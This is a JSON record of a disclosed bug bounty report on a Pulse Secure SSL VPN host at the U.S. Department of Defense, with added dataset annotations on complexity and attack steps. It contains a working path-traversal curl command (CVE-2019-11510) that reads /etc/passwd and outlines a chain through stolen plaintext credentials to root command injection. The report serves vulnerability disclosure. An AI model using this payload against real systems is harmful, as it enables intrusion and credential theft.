{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "sp1d3rs ",
  "title": "Arbitrary File Reading leads to RCE in the Pulse Secure SSL VPN on the https://\u2588\u2588\u2588\u2588",
  "content": "\nDescription\nHello. Some time ago, researcher Orange Tsai from DEVCORE team had a talk on Defcon/BlackHat regarding Pulse Secure SSL VPN vulnerabilities fixed on 2019/4/25:\nCVE-2019-11510 - Pre-auth Arbitrary File Reading\nCVE-2019-11542 - Post-auth Stack Buffer Overflow\nCVE-2019-11539 - Post-auth Command Injection\nCVE-2019-11538 - Post-auth Arbitrary File Reading\nCVE-2019-11508 - Post-auth Arbitrary File Writing\nCVE-2019-11540 - Post-auth Session Hijacking\nLink to the slides: https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf\nI discovered that https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 instance is vulnerable to described vulnerabilities.\nPOC\nReading /etc/passwd via CVE-2019-11510:\nCode 132 Bytes\n1curl -i -k --path-as-is https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/\nCode 71 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n2\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n4\u2588\u2588\u2588\u2588\n5\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nThe RCE can be achieved with this chain:\n1) Pulse Secure stores credentials in the cleartext.\n2) Attacker reads credentials and authorizes on VPN\n3) Attacker exploits CVE-2019-11539 - Post-auth Command Injection achieving RCE as root.\nSuggested fix\nUpdate the Pulse Secure SSL VPN software.\nImpact\nRemote code execution as root (by reading plaintext credentials and then exploiting CVE-2019-11539 - Post-auth Command Injection) and accessing intranet behind VPN.\nYou can see here example report to Twitter by Orange Tsai: https://hackerone.com/reports/591295\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 5000,
  "weaknesses": [
    "File and Directory Information Exposure"
  ],
  "screenshots": {},
  "disclosed_date": 1627602540,
  "report_url": "https://hackerone.com/reports/695005",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "curl -i -k --path-as-is https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"
    ],
    [
      2,
      "Extract plaintext credentials from the VPN configuration files"
    ],
    [
      3,
      "Authenticate to the VPN using the obtained credentials"
    ],
    [
      4,
      "Exploit CVE-2019-11539 (Post-auth Command Injection) to achieve RCE as root"
    ]
  ],
  "vuln_description": "The vulnerability involves a chain of exploits starting with an arbitrary file read (CVE-2019-11510) to extract plaintext credentials stored by Pulse Secure SSL VPN. These credentials are then used to authenticate to the VPN, followed by exploiting a post-authentication command injection vulnerability (CVE-2019-11539) to achieve remote code execution as root.",
  "reason": "The attack involves multiple components (file read, credential extraction, authentication, command injection) and requires understanding the interaction between these components. However, the steps are somewhat linear and the vulnerabilities are documented, making the discovery process less subtle.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": "591295"
}